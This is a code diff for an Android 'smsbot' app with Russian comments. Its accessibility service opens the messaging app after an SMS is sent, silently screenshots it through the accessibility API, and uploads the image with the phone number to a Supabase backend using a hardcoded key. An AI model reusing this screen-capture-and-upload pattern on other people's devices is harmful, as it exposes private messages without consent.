@@ -2,28 +2,22 @@ package com.smsbot;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.accessibilityservice.ScreenshotResult;
+import android.accessibilityservice.TakeScreenshotCallback;
 import android.content.Intent;
 import android.graphics.Bitmap;
-import android.graphics.PixelFormat;
-import android.hardware.display.DisplayManager;
-import android.hardware.display.VirtualDisplay;
-import android.media.Image;
-import android.media.ImageReader;
-import android.media.projection.MediaProjection;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 import android.util.Base64;
-import android.util.DisplayMetrics;
 import android.util.Log;
-import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.nio.ByteBuffer;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
@@ -32,7 +26,6 @@ public class SmsAccessibilityService extends AccessibilityService {
     private static final String SUPABASE_KEY = "sb_publishable_5Nr0YPv96-6cyQQKoDXlqg_OkhyqPvB";
     private static SmsAccessibilityService instance;
     private String pendingPhone = null;
-    private MediaProjection mediaProjection;
     private Handler handler = new Handler(Looper.getMainLooper());
 
     public static SmsAccessibilityService getInstance() {
@@ -47,17 +40,18 @@ public class SmsAccessibilityService extends AccessibilityService {
         info.eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
         info.notificationTimeout = 500;
-        info.packageNames = new String[]{"com.google.android.apps.messaging", "com.android.mms", "com.samsung.android.messaging"};
+        info.packageNames = new String[]{
+                "com.google.android.apps.messaging",
+                "com.android.mms",
+                "com.samsung.android.messaging"
+        };
         setServiceInfo(info);
     }
 
+    // Вызывается из SmsBotService после успешной отправки SMS
     public void setPendingPhone(String phone) {
         this.pendingPhone = phone;
         handler.post(() -> openSmsApp());
-    }
-
-    public void setMediaProjection(MediaProjection mp) {
-        this.mediaProjection = mp;
     }
 
     private void openSmsApp() {
@@ -67,7 +61,7 @@ public class SmsAccessibilityService extends AccessibilityService {
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
         } catch (Exception e) {
-            Log.e("SMS_ACCESS", "Cannot open SMS app", e);
+            Log.e("SMS_ACCESS", "Не удалось открыть SMS", e);
         }
     }
 
@@ -77,60 +71,59 @@ public class SmsAccessibilityService extends AccessibilityService {
         if (event.getPackageName() == null) return;
 
         String pkg = event.getPackageName().toString();
-        if (pkg.contains("mms") || pkg.contains("messaging")) {
+        if (pkg.contains("mms") || pkg.contains("messaging") || pkg.contains("messages")) {
             handler.removeCallbacksAndMessages(null);
             handler.postDelayed(() -> {
+                String phoneCopy = pendingPhone;
+                if (phoneCopy == null) return;
                 takeScreenshotAndUpload();
                 pendingPhone = null;
-            }, 3000); // Увеличил задержку до 3 секунд
+            }, 3000);
         }
     }
 
     private void takeScreenshotAndUpload() {
-        if (mediaProjection == null) {
-            Log.e("SMS_ACCESS", "MediaProjection is null");
+        final String phoneForUpload = pendingPhone;
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            Log.e("SMS_ACCESS", "Требуется Android 11+");
             return;
         }
-        Log.d("SMS_ACCESS", "Taking screenshot for phone: " + pendingPhone);
-        ImageReader reader = null;
-        VirtualDisplay vd = null;
-        Image image = null;
-        try {
-            DisplayMetrics metrics = new DisplayMetrics();
-            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-            wm.getDefaultDisplay().getRealMetrics(metrics);
-            int w = metrics.widthPixels, h = metrics.heightPixels;
-            reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
-            vd = mediaProjection.createVirtualDisplay("screen_capture", w, h, metrics.densityDpi,
-                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, null);
-            Thread.sleep(1000);
-            image = reader.acquireLatestImage();
-            if (image != null) {
-                Image.Plane[] planes = image.getPlanes();
-                ByteBuffer buffer = planes[0].getBuffer();
-                int pixelStride = planes[0].getPixelStride();
-                int rowStride = planes[0].getRowStride();
-                int rowPadding = rowStride - pixelStride * w;
-                Bitmap bitmap = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888);
-                bitmap.copyPixelsFromBuffer(buffer);
-                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, w, h);
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                cropped.compress(Bitmap.CompressFormat.JPEG, 80, baos);
-                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
-                Log.d("SMS_ACCESS", "Screenshot taken, size: " + base64.length());
-                updateTaskInSupabase(pendingPhone, base64);
-                bitmap.recycle();
-                cropped.recycle();
-            } else {
-                Log.e("SMS_ACCESS", "Image is null");
-            }
-        } catch (Exception e) {
-            Log.e("SMS_ACCESS", "Screenshot error", e);
-        } finally {
-            try { if (image != null) image.close(); } catch (Exception ignored) {}
-            try { if (vd != null) vd.release(); } catch (Exception ignored) {}
-            try { if (reader != null) reader.close(); } catch (Exception ignored) {}
-        }
+        takeScreenshot(
+                android.view.Display.DEFAULT_DISPLAY,
+                getMainExecutor(),
+                new TakeScreenshotCallback() {
+                    @Override
+                    public void onSuccess(ScreenshotResult result) {
+                        try {
+                            Bitmap bitmap = Bitmap.wrapHardwareBuffer(
+                                    result.getHardwareBuffer(),
+                                    result.getColorSpace()
+                            );
+                            if (bitmap == null) {
+                                Log.e("SMS_ACCESS", "Bitmap пустой");
+                                return;
+                            }
+                            Bitmap copy = bitmap.copy(Bitmap.Config.ARGB_8888, false);
+                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                            copy.compress(Bitmap.CompressFormat.JPEG, 80, baos);
+                            String base64 = Base64.encodeToString(
+                                    baos.toByteArray(),
+                                    Base64.NO_WRAP
+                            );
+                            updateTaskInSupabase(phoneForUpload, base64);
+                            copy.recycle();
+                            result.getHardwareBuffer().close();
+                        } catch (Exception e) {
+                            Log.e("SMS_ACCESS", "Ошибка сохранения скриншота", e);
+                        }
+                    }
+
+                    @Override
+                    public void onFailure(int errorCode) {
+                        Log.e("SMS_ACCESS", "Ошибка скриншота: " + errorCode);
+                    }
+                }
+        );
     }
 
     private void updateTaskInSupabase(String phone, String screenshotBase64) {
@@ -161,7 +154,7 @@ public class SmsAccessibilityService extends AccessibilityService {
             updateConn.getOutputStream().write(updateBody.toString().getBytes());
             updateConn.getResponseCode();
         } catch (Exception e) {
-            Log.e("SMS_ACCESS", "Update error", e);
+            Log.e("SMS_ACCESS", "Supabase update error", e);
         }
     }
 
